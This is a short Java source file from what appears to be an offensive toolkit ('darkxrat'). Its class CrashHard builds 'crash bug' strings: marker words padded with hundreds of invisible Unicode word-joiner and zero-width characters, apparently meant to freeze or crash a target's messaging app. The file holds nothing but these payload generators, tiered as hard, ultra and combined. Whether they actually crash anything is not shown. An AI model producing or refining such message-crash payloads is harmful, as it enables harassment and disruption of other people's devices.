package com.darkxrat.mantax.func.bug;

public class CrashHard {
    public static final String NAMA = "CRASH HARD";
    public static final String TIPE = "BUG";

    public static String func() {
        return "\u2060".repeat(50) + "CRASH_HARD" + "\u2060".repeat(50);
    }

    public static String funcHard() {
        return "\u2060".repeat(100) + "CRASH_HARD_X" + "\u2060".repeat(100);
    }

    public static String funcUltra() {
        return "\u2060".repeat(200) + "CRASH_HARD_ULTRA" + "\u2060".repeat(200);
    }

    public static String funcGacor() {
        return funcHard() + "\u200B" + funcUltra();
    }
}